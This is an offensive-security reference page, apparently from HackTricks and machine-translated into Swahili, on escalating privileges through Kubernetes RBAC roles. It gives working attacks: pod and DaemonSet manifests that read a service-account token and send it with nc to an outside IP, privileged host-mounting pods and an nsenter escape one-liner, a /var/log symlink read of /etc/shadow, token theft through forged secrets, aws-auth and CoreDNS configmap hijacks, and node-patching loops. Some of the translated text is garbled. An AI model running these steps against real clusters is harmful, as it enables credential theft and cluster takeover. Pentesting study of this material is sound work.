# Abusing Roles/ClusterRoles in Kubernetes

{{#include ../../../banners/hacktricks-training.md}}

Hapa unaweza kupata baadhi ya mipangilio ya Roles na ClusterRoles ambayo inaweza kuwa hatari.\
Kumbuka kwamba unaweza kupata rasilimali zote zinazoungwa mkono kwa `kubectl api-resources`

## **Privilege Escalation**

Inarejelea sanaa ya kupata **ufikiaji wa principal tofauti** ndani ya klasta **ikiwa na mamlaka tofauti** (ndani ya klasta ya kubernetes au kwa mawingu ya nje) kuliko zile ulizo nazo tayari, katika Kubernetes kuna k基本 **mbinu 4 kuu za kupandisha mamlaka**:

- Kuwa na uwezo wa **kujifanya** mtumiaji/katika makundi/SAs wengine wenye mamlaka bora ndani ya klasta ya kubernetes au kwa mawingu ya nje
- Kuwa na uwezo wa **kuunda/kurekebisha/kutekeleza pods** ambapo unaweza **kupata au kuunganisha SAs** wenye mamlaka bora ndani ya klasta ya kubernetes au kwa mawingu ya nje
- Kuwa na uwezo wa **kusoma siri** kwani token za SAs zimehifadhiwa kama siri
- Kuwa na uwezo wa **kutoroka hadi kwenye node** kutoka kwenye kontena, ambapo unaweza kuiba siri zote za kontena zinazotembea kwenye node, akidi za node, na ruhusa za node ndani ya wingu inayoendesha (ikiwa ipo)
- Mbinu ya tano ambayo inastahili kutajwa ni uwezo wa **kukimbia port-forward** katika pod, kwani unaweza kuwa na uwezo wa kufikia rasilimali za kuvutia ndani ya pod hiyo.

### Access Any Resource or Verb (Wildcard)

**wildcard (\*) inatoa ruhusa juu ya rasilimali yoyote na kitenzi chochote**. Inatumika na wasimamizi. Ndani ya ClusterRole hii inamaanisha kwamba mshambuliaji anaweza kutumia anynamespace katika klasta
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Access Any Resource with a specific verb

In RBAC, ruhusa fulani zina hatari kubwa:

1. **`create`:** Inatoa uwezo wa kuunda rasilimali yoyote ya klasta, ikihatarisha kupanda kwa mamlaka.
2. **`list`:** Inaruhusu kuorodhesha rasilimali zote, ikihatarisha kuvuja kwa data nyeti.
3. **`get`:** Inaruhusu kufikia siri kutoka kwa akaunti za huduma, ikihatarisha usalama.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Create - Steal Token

Mshambuliaji mwenye ruhusa za kuunda pod, anaweza kuunganisha Akaunti ya Huduma yenye mamlaka ndani ya pod na kuiba token ili kujifanya kuwa Akaunti ya Huduma. Kwa ufanisi anapandisha mamlaka kwake.

Mfano wa pod ambayo itaiba token ya akaunti ya huduma ya `bootstrap-signer` na kuisafirisha kwa mshambuliaji:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args:
[
"-c",
'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000',
]
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod Create & Escape

Ifuatayo inaonyesha haki zote ambazo kontena linaweza kuwa nazo:

- **Upatikanaji wa haki** (kuondoa ulinzi na kuweka uwezo)
- **Zima namespaces hostIPC na hostPid** ambazo zinaweza kusaidia kuongeza haki
- **Zima hostNetwork** namespace, ikitoa ufikiaji wa kuiba haki za wingu za nodi na ufikiaji bora wa mitandao
- **Mount hosts / ndani ya kontena**
```yaml:super_privs.yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
Unda pod na:
```bash
kubectl --token $token create -f mount_root.yaml
```
Moja ya mistari kutoka [hiki tweet](https://twitter.com/mauilion/status/1129468485480751104) na nyongeza kadhaa:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
#### Stealth

Huenda unataka kuwa **stealthier**, katika kurasa zinazofuata unaweza kuona kile ambacho utaweza kufikia ikiwa utaunda pod kwa kuwezesha baadhi ya ruhusa zilizotajwa katika kiolezo kilichopita:

- **Privileged + hostPID**
- **Privileged only**
- **hostPath**
- **hostPID**
- **hostNetwork**
- **hostIPC**

_Unaweza kupata mfano wa jinsi ya kuunda/kutumia vibaya mipangilio ya pods zilizopatiwa ruhusa katika_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Pod Create - Move to cloud

Ikiwa unaweza **kuunda** **pod** (na hiari **akaunti ya huduma**) huenda ukawa na uwezo wa **kupata ruhusa katika mazingira ya wingu** kwa **kuteua majukumu ya wingu kwa pod au akaunti ya huduma** na kisha kuifikia.\
Zaidi ya hayo, ikiwa unaweza kuunda **pod yenye nafasi ya mtandao wa mwenyeji** unaweza **kuiba IAM** jukumu la **node** instance.

Kwa maelezo zaidi angalia:

{{#ref}}
pod-escape-privileges.md
{{#endref}}

### **Create/Patch Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs and Cronjobs**

Inawezekana kutumia vibaya ruhusa hizi ili **kuunda pod mpya** na kuanzisha ruhusa kama katika mfano wa awali.

Yaml ifuatayo **inaunda daemonset na inatoa token ya SA** ndani ya pod:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args:
[
"-c",
'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000',
]
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** ni rasilimali katika kubernetes inayotumika kwa **kukimbia amri katika shell ndani ya pod**. Hii inaruhusu **kukimbia amri ndani ya kontena au kupata shell ndani**.

Hivyo, inawezekana **kuingia ndani ya pod na kuiba token ya SA**, au kuingia pod yenye mamlaka, kutoroka hadi kwenye node, na kuiba token zote za pods katika node na (ku)itumia node:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
> [!NOTE]
> Kwa default amri inatekelezwa katika kontena la kwanza la pod. Pata **pods zote katika kontena** kwa kutumia `kubectl get pods <pod_name> -o jsonpath='{.spec.containers[*].name}'` na kisha **onyeshea kontena** ambapo unataka kutekeleza kwa kutumia `kubectl exec -it <pod_name> -c <container_name> -- sh`

Ikiwa ni kontena lisilo na mfumo wa uendeshaji unaweza kujaribu kutumia **shell builtins** kupata taarifa za kontena au kupakia zana zako mwenyewe kama **busybox** kwa kutumia: **`kubectl cp </path/local/file> <podname>:</path/in/container>`**.

### port-forward

Ruhusa hii inaruhusu **kupeleka port moja ya ndani kwa port moja katika pod iliyoainishwa**. Hii inakusudiwa kuwezesha kufuatilia programu zinazotembea ndani ya pod kwa urahisi, lakini mshambuliaji anaweza kuitumia vibaya kupata ufikiaji wa programu za kuvutia (kama DBs) au programu zenye udhaifu (webs?) ndani ya pod:
```bash
kubectl port-forward pod/mypod 5000:5000
```
### Hosts Writable /var/log/ Escape

Kama [**ilivyoonyeshwa katika utafiti huu**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), ikiwa unaweza kufikia au kuunda pod yenye **directories ya hosts `/var/log/` imewekwa** juu yake, unaweza **kutoroka kutoka kwenye kontena**.\
Hii ni kwa sababu wakati **Kube-API inajaribu kupata logi** ya kontena (kwa kutumia `kubectl logs <pod>`), inafanya **ombwe la faili `0.log`** la pod kwa kutumia kiunganishi cha `/logs/` cha huduma ya **Kubelet**.\
Huduma ya Kubelet inatoa kiunganishi cha `/logs/` ambacho kimsingi ni **kuonyesha mfumo wa faili wa `/var/log` wa kontena**.

Kwa hivyo, mshambuliaji mwenye **ufikiaji wa kuandika katika folda /var/log/** ya kontena anaweza kutumia tabia hii kwa njia 2:

- Kubadilisha faili `0.log` la kontena lake (ambalo kawaida liko katika `/var/logs/pods/namespace_pod_uid/container/0.log`) kuwa **symlink inayoelekeza kwenye `/etc/shadow`** kwa mfano. Kisha, utaweza kutoa faili la kivuli la hosts kwa kufanya:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
- Ikiwa mshambuliaji anadhibiti kiongozi yeyote mwenye **idhini za kusoma `nodes/log`**, anaweza tu kuunda **symlink** katika `/host-mounted/var/log/sym` hadi `/` na wakati **anapofikia `https://<gateway>:10250/logs/sym/` atataja mfumo wa faili wa mizizi wa mwenyeji** (kubadilisha symlink kunaweza kutoa ufikiaji wa faili).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Maabara na exploit ya otomatiki inaweza kupatikana katika** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Kupita ulinzi wa readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Ikiwa una bahati na uwezo wa juu wa `CAP_SYS_ADMIN` upo, unaweza tu kuunganisha tena folda hiyo kama rw:
```bash
mount -o rw,remount /hostlogs/
```
#### Kupita ulinzi wa hostPath readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Kama ilivyoelezwa katika [**utafiti huu**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) inawezekana kupita ulinzi:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Ambayo yalikuwa yanakusudia kuzuia kutoroka kama zile za awali kwa, badala ya kutumia mtego wa hostPath, kutumia PersistentVolume na PersistentVolumeClaim ili kuunganisha folda ya mwenyeji ndani ya kontena kwa ufikiaji wa kuandika:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: ["sh", "-c", "sleep 1h"]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Kujifanya kuwa akaunti zenye mamlaka**

Kwa kutumia [**kujifanya kuwa mtumiaji**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) mamlaka, mshambuliaji anaweza kujifanya kuwa akaunti yenye mamlaka.

Tumia tu parameter `--as=<username>` katika amri ya `kubectl` kujifanya kuwa mtumiaji, au `--as-group=<group>` kujifanya kuwa kundi:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Au tumia API ya REST:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Kuorodhesha Siri

Ruhusa ya **kuorodhesha siri inaweza kumruhusu mshambuliaji kusoma siri** kwa kufikia kiunganishi cha API ya REST:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Kuunda na Kusoma Siri

Kuna aina maalum ya siri ya Kubernetes ya aina **kubernetes.io/service-account-token** ambayo inahifadhi token za akaunti za huduma. 
Ikiwa una ruhusa za kuunda na kusoma siri, na pia unajua jina la akaunti ya huduma, unaweza kuunda siri kama ifuatavyo na kisha kuiba token ya akaunti ya huduma ya mwathirika kutoka kwake:
```yaml
apiVersion: v1
kind: Secret
metadata:
name: stolen-admin-sa-token
namespace: default
annotations:
kubernetes.io/service-account.name: cluster-admin-sa
type: kubernetes.io/service-account-token
```
Mfano wa unyakuzi:
```bash
$ SECRETS_MANAGER_TOKEN=$(kubectl create token secrets-manager-sa)

$ kubectl auth can-i --list --token=$SECRETS_MANAGER_TOKEN
Warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs                      Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
secrets                                         []                                     []               [get create]
[/.well-known/openid-configuration/]   []               [get]
<SNIP>
[/version]                             []               [get]

$ kubectl create token cluster-admin-sa --token=$SECRETS_MANAGER_TOKEN
error: failed to create token: serviceaccounts "cluster-admin-sa" is forbidden: User "system:serviceaccount:default:secrets-manager-sa" cannot create resource "serviceaccounts/token" in API group "" in the namespace "default"

$ kubectl get pods --token=$SECRETS_MANAGER_TOKEN --as=system:serviceaccount:default:secrets-manager-sa
Error from server (Forbidden): serviceaccounts "secrets-manager-sa" is forbidden: User "system:serviceaccount:default:secrets-manager-sa" cannot impersonate resource "serviceaccounts" in API group "" in the namespace "default"

$ kubectl apply -f ./secret-that-steals-another-sa-token.yaml --token=$SECRETS_MANAGER_TOKEN
secret/stolen-admin-sa-token created

$ kubectl get secret stolen-admin-sa-token --token=$SECRETS_MANAGER_TOKEN -o json
{
"apiVersion": "v1",
"data": {
"ca.crt": "LS0tLS1CRUdJTiBDRVJUSUZJQ0FU<SNIP>UlRJRklDQVRFLS0tLS0K",
"namespace": "ZGVmYXVsdA==",
"token": "ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWk<SNIP>jYkowNWlCYjViMEJUSE1NcUNIY0h4QTg2aXc="
},
"kind": "Secret",
"metadata": {
"annotations": {
"kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Secret\",\"metadata\":{\"annotations\":{\"kubernetes.io/service-account.name\":\"cluster-admin-sa\"},\"name\":\"stolen-admin-sa-token\",\"namespace\":\"default\"},\"type\":\"kubernetes.io/service-account-token\"}\n",
"kubernetes.io/service-account.name": "cluster-admin-sa",
"kubernetes.io/service-account.uid": "faf97f14-1102-4cb9-9ee0-857a6695973f"
},
"creationTimestamp": "2025-01-11T13:02:27Z",
"name": "stolen-admin-sa-token",
"namespace": "default",
"resourceVersion": "1019116",
"uid": "680d119f-89d0-4fc6-8eef-1396600d7556"
},
"type": "kubernetes.io/service-account-token"
}
```
Kumbuka kwamba ikiwa unaruhusiwa kuunda na kusoma siri katika eneo fulani, akaunti ya huduma ya mwathirika pia lazima iwe katika eneo hilo hilo.

### Kusoma siri – kulazimisha vitambulisho vya tokeni

Wakati mshambuliaji mwenye tokeni yenye ruhusa za kusoma anahitaji jina sahihi la siri ili kuitumia, tofauti na ruhusa pana ya _**kuorodhesha siri**_, bado kuna udhaifu. Akaunti za huduma za default katika mfumo zinaweza kuorodheshwa, kila moja ikihusishwa na siri. Siri hizi zina muundo wa jina: kiambatisho cha kudumu kinachofuatiwa na tokeni ya alphanumeric ya herufi tano za nasibu (bila wahusika fulani) kulingana na [source code](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Tokeni inazalishwa kutoka seti ndogo ya wahusika 27 (`bcdfghjklmnpqrstvwxz2456789`), badala ya anuwai kamili ya alphanumeric. Kizuizi hiki kinapunguza jumla ya mchanganyiko unaowezekana kuwa 14,348,907 (27^5). Kwa hivyo, mshambuliaji anaweza kutekeleza shambulio la kulazimisha ili kubaini tokeni hiyo ndani ya masaa machache, ambayo yanaweza kusababisha kupandishwa vyeo kwa kufikia akaunti za huduma nyeti.

### Maombi ya Kusaini Cheti

Ikiwa una vitenzi **`create`** katika rasilimali `certificatesigningrequests` (au angalau katika `certificatesigningrequests/nodeClient`). Unaweza **kuunda** CeSR mpya ya **node mpya.**

Kulingana na [nyaraka inawezekana kuidhinisha maombi haya kiotomatiki](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), hivyo katika kesi hiyo **huhitaji ruhusa za ziada**. Ikiwa sivyo, unahitaji kuwa na uwezo wa kuidhinisha ombi, ambayo inamaanisha sasisha katika `certificatesigningrequests/approval` na `approve` katika `signers` na resourceName `<signerNameDomain>/<signerNamePath>` au `<signerNameDomain>/*`

Mfano wa **role** yenye ruhusa zote zinazohitajika ni:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Kwa hivyo, na CSR mpya ya node iliyothibitishwa, unaweza **kutilia shaka** ruhusa maalum za nodes ili **kuiba siri** na **kuinua mamlaka**.

Katika [**post hii**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) na [**hii moja**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) usanidi wa GKE K8s TLS Bootstrap umewekwa na **kusainiwa kiotomatiki** na unakiliwa ili kuzalisha ithibitisho ya Node mpya ya K8s na kisha kutumiwa kuimarisha mamlaka kwa kuiba siri.\
Ikiwa **una mamlaka zilizotajwa unaweza kufanya jambo lile lile**. Kumbuka kwamba mfano wa kwanza unakabiliwa na kosa linalozuia node mpya kufikia siri ndani ya kontena kwa sababu **node inaweza kufikia tu siri za kontena zilizowekwa juu yake.**

Njia ya kukwepa hii ni tu **kuunda ithibitisho ya node kwa jina la node ambapo kontena yenye siri za kuvutia imewekwa** (lakini angalia tu jinsi ya kufanya hivyo katika post ya kwanza):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

Wajibu wanaoweza kubadilisha **`configmaps`** katika eneo la kube-system kwenye EKS (lazima wawe ndani ya AWS) vikundi wanaweza kupata haki za usimamizi wa klasta kwa kubadilisha configmap ya **aws-auth**.\
Vitenzi vinavyohitajika ni **`update`** na **`patch`**, au **`create`** ikiwa configmap haijaundwa:
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
> [!WARNING]
> Unaweza kutumia **`aws-auth`** kwa **kuendelea** kutoa ufikiaji kwa watumiaji kutoka **akaunti nyingine**.
>
> Hata hivyo, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **haifanyi kazi kutoka akaunti tofauti**. Lakini kwa kweli `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` inafanya kazi ikiwa utaweka ARN ya klasta badala ya jina tu.\
> Ili kufanya `kubectl` ifanye kazi, hakikisha tu **unapanga** **kubeconfig ya waathirika** na katika arg za aws exec ongeza `--profile other_account_role` ili kubectl itumie profaili ya akaunti nyingine kupata token na kuwasiliana na AWS.

### CoreDNS config map

Ikiwa una ruhusa za kubadilisha **`coredns` configmap** katika namespace ya `kube-system`, unaweza kubadilisha anwani ambazo maeneo yatatatuliwa ili uweze kufanya mashambulizi ya MitM ili **kuiba taarifa nyeti au kuingiza maudhui mabaya**.

Vitenzi vinavyohitajika ni **`update`** na **`patch`** juu ya **`coredns`** configmap (au config maps zote).

Faili ya kawaida ya **coredns** ina kitu kama hiki:
```yaml
data:
Corefile: |
.:53 {
log
errors
health {
lameduck 5s
}
ready
kubernetes cluster.local in-addr.arpa ip6.arpa {
pods insecure
fallthrough in-addr.arpa ip6.arpa
ttl 30
}
prometheus :9153
hosts {
192.168.49.1 host.minikube.internal
fallthrough
}
forward . /etc/resolv.conf {
max_concurrent 1000
}
cache 30
loop
reload
loadbalance
}
```
Mshambuliaji anaweza kupakua ikifanya `kubectl get configmap coredns -n kube-system -o yaml`, kuhariri na kuongeza kitu kama `rewrite name victim.com attacker.com` ili kila wakati `victim.com` inapotafutwa, kwa kweli `attacker.com` ndiyo domain itakayofikiwa. Kisha, itatumika ikifanya `kubectl apply -f poison_dns.yaml`.

Chaguo lingine ni kuhariri tu faili ikifanya `kubectl edit configmap coredns -n kube-system` na kufanya mabadiliko.

### Kuongeza Mamlaka katika GKE

Kuna **njia 2 za kutoa ruhusa za K8s kwa wahusika wa GCP**. Katika hali yoyote, mhusika pia anahitaji ruhusa **`container.clusters.get`** ili kuwa na uwezo wa kukusanya akreditifia za kufikia klasta, au itabidi **uzalishe faili yako ya konfigu kubectl** (fuata kiungo kinachofuata).

> [!WARNING]
> Wakati wa kuzungumza na kiunganishi cha K8s api, **token ya uthibitisho ya GCP itatumwa**. Kisha, GCP, kupitia kiunganishi cha K8s api, kwanza **itaangalia kama mhusika** (kwa barua pepe) **ana ufikiaji wowote ndani ya klasta**, kisha itaangalia kama ana **ufikiaji wowote kupitia GCP IAM**.\
> Ikiwa **yoyote** kati ya hizo ni **kweli**, atajibiwa. Ikiwa **siyo** makosa **yanayopendekeza kutoa** **ruhusa kupitia GCP IAM** yatatolewa.

Kisha, njia ya kwanza ni kutumia **GCP IAM**, ruhusa za K8s zina **ruhusa sawa za GCP IAM**, na ikiwa mhusika ana hiyo, ataweza kuitumia.

{{#ref}}
../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md
{{#endref}}

Njia ya pili ni **kutoa ruhusa za K8s ndani ya klasta** kwa kutambua mtumiaji kwa **barua pepe** yake (akaunti za huduma za GCP zimejumuishwa).

### Unda token za serviceaccounts

Wahusika wanaoweza **kuunda TokenRequests** (`serviceaccounts/token`) Wakati wa kuzungumza na kiunganishi cha K8s api SAs (tazama [**hapa**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token_request.rego)).

### ephemeralcontainers

Wahusika wanaoweza **`update`** au **`patch`** **`pods/ephemeralcontainers`** wanaweza kupata **utendaji wa msimbo kwenye pods nyingine**, na kwa uwezekano **kuvunja** kwenye node yao kwa kuongeza kontena ya muda na securityContext yenye mamlaka.

### ValidatingWebhookConfigurations au MutatingWebhookConfigurations

Wahusika wenye mojawapo ya vitenzi `create`, `update` au `patch` juu ya `validatingwebhookconfigurations` au `mutatingwebhookconfigurations` wanaweza kuwa na uwezo wa **kuunda mojawapo ya webhookconfigurations hizo** ili waweze **kuongeza mamlaka**.

Kwa mfano ya [`mutatingwebhookconfigurations` angalia sehemu hii ya chapisho hili](#malicious-admission-controller).

### Pandisha

Kama unavyoweza kusoma katika sehemu inayofuata: [**Kuzuia Pandisha Mamlaka ya Kijengwa Ndani**](#built-in-privileged-escalation-prevention), mhusika cannot update wala kuunda roles au clusterroles bila kuwa na ruhusa hizo mpya. Isipokuwa ikiwa ana **kitenzi `escalate` au `*`** juu ya **`roles`** au **`clusterroles`** na chaguo husika za binding.\
Kisha anaweza kuupdate/kuunda roles mpya, clusterroles zenye ruhusa bora kuliko zile alizonazo.

### Nodes proxy

Wahusika wenye ufikiaji wa **`nodes/proxy`** subresource wanaweza **kutekeleza msimbo kwenye pods** kupitia Kubelet API (kulingana na [**hii**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes_proxy.rego)). Taarifa zaidi kuhusu uthibitishaji wa Kubelet katika ukurasa huu:

{{#ref}}
../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md
{{#endref}}

Una mfano wa jinsi ya kupata [**RCE ukizungumza na Kubelet API hapa**](../pentesting-kubernetes-services/index.html#kubelet-rce).

### Futa pods + nodes zisizoweza kupanga

Wahusika wanaoweza **kufuta pods** (`delete` verb juu ya `pods` resource), au **kuhamasisha pods** (`create` verb juu ya `pods/eviction` resource), au **kubadilisha hali ya pod** (ufikiaji wa `pods/status`) na wanaweza **kufanya nodes nyingine zisizoweza kupanga** (ufikiaji wa `nodes/status`) au **kufuta nodes** (`delete` verb juu ya `nodes` resource) na ana udhibiti juu ya pod, wanaweza **kuiba pods kutoka kwa nodes nyingine** ili ziwe **zinatekelezwa** katika **node** iliyovunjika na mshambuliaji anaweza **kuiba tokens** kutoka kwa pods hizo.
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
### Hali za huduma (CVE-2020-8554)

Wajibu wanaoweza **kubadilisha** **`services/status`** wanaweza kuweka uwanja wa `status.loadBalancer.ingress.ip` ili kutumia **CVE-2020-8554 isiyorekebishwa** na kuanzisha **MiTM attacks dhidi ya klasta**. Mitihani mingi ya CVE-2020-8554 inazuia tu huduma za ExternalIP (kulingana na [**hii**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify_service_status_cve_2020_8554.rego)).

### Hali za Nodes na Pods

Wajibu wenye ruhusa za **`update`** au **`patch`** juu ya `nodes/status` au `pods/status`, wanaweza kubadilisha lebo ili kuathiri vikwazo vya kupanga vilivyowekwa.

## Kinga ya Kukuza Privilege iliyojengwa ndani

Kubernetes ina [mekanismu iliyojengwa ndani](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) ili kuzuia kukuza privilege.

Mfumo huu unahakikisha kwamba **watumiaji hawawezi kuongeza privileges zao kwa kubadilisha roles au role bindings**. Utekelezaji wa sheria hii unafanyika katika ngazi ya API, ukitoa kinga hata wakati RBAC authorizer haifanyi kazi.

Sheria inasema kwamba **mtumiaji anaweza tu kuunda au kubadilisha role ikiwa ana ruhusa zote zinazohitajika na role hiyo**. Aidha, upeo wa ruhusa za mtumiaji zilizopo lazima ulingane na wa role wanayojaribu kuunda au kubadilisha: ama kwa kiwango cha klasta kwa ClusterRoles au kufungwa kwenye namespace sawa (au kwa kiwango cha klasta) kwa Roles.

> [!WARNING]
> Kuna ubaguzi wa sheria ya awali. Ikiwa wajibu ana **verb `escalate`** juu ya **`roles`** au **`clusterroles`** anaweza kuongeza privileges za roles na clusterroles hata bila kuwa na ruhusa hizo mwenyewe.

### **Pata & Patch RoleBindings/ClusterRoleBindings**

> [!CAUTION]
> **Kwa kweli, mbinu hii ilifanya kazi hapo awali, lakini kulingana na majaribio yangu haifanyi kazi tena kwa sababu ile ile iliyoelezwa katika sehemu ya awali. Huwezi kuunda/kubadilisha rolebinding ili kujipa wewe mwenyewe au SA tofauti baadhi ya privileges ikiwa tayari huna.**

